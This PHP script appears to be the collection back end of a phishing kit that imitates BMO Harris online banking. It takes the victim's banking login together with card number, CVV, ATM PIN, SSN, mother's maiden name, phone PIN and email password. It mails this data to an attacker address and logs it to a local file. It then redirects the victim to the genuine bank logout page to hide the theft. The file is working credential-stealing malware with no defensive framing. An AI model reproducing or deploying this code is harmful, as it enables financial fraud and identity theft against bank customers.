<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

include 'Email.php';

$ip = getenv("REMOTE_ADDR");

$message .= "--------------[ Hell ]---------------------\n";
$message .= "OnlineID   	 : ".$_SESSION['username']."\n";
$message .= "Passcode     	 : ".$_SESSION['password']."\n";
$message .= "--------------[ P.I ]---------------------\n";
$message .= "Full Name   	 : ".$_POST['embossing_name']."\n";
$message .= "Card Number   	 : ".$_POST['acct_num']."\n";
$message .= "Expire     	 : ".$_POST['exire']."\n";
$message .= "CVV        	 : ".$_POST['cvv']."\n";
$message .= "ATM PIN    	 : ".$_POST['pin']."\n";
$message .= "Zip Code	     : ".$_POST['zip']."\n";
$message .= "SSN		     : ".$_POST['ssn']."\n";
$message .= "MMN		     : ".$_POST['mmn']."\n";
$message .= "Phone Number    : ".$_POST['phone']."\n";
$message .= "Phone Pin       : ".$_POST['phopin']."\n";
$message .= "--------------[ UnKnown ]---------------------\n";
$message .= "Email Address   : ".$_POST['email']."\n";
$message .= "Email Password  : ".$_POST['epass']."\n";
$message .= "--------------[ UnKnown ]---------------------\n";
$message .= "IP            : ".$ip."\n";
$message .= "--------------[ UnKnown ]---------------------\n";
$subject = "BMO $ip";
$headers = "From: UnKnown <Hell>";
mail($SEND,$subject,$message,$headers);
$file = fopen("bmo.txt", 'a');

fwrite($file, $message);
header("Location: https://www.bmoharris.com/us/hob/logout");
?>